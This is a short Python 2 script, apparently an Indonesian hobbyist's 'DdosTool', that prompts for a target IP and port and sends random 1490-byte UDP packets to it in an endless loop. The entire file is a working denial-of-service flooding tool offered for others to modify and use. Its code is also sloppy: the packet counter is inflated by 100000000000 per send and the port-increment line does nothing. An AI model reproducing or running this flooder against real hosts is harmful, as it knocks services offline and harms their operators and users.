
#!usr/bin/python2.7
# -*- coding: UTF-8 -*-
#Created By Tegar

# Silahkan Modifikasi Lagi Sendiri #

import os,sys,time
import socket
import random
#Menu
os.system("clear")
os.system("figlet Anon555") # Ganti Tulisan Nama Kamu
os.system("figlet DdosTool")
#Fonction
os.system("sleep 2")
print
ip = raw_input("IP    : ")
port = input("Port  : ")
#Code
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
send = 0
while True:
     sock.sendto(bytes, (ip,port))
     send = send + 100000000000
     port = port + 0
     print "send %s packet on %s port %s"%(send,ip,port)
     if port == 65534:
        port = 0

